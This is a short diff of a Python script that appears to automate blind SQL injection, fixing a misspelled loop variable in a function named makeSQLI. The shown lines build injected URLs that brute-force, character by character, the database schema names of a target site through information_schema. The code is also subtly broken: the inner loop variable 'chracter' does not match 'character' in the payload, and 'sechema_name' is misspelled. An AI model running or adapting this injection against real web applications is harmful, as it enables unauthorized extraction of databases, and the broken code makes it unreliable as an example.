@@ -24,7 +24,7 @@ def makeSQLI():
   p2 = log.progress("Extracted data")
   extracted_info = ""
 
-  for pisition in range(1,150):
+  for position in range(1,150):
     for chracter in range(33, 126):
       sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(sechema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
       
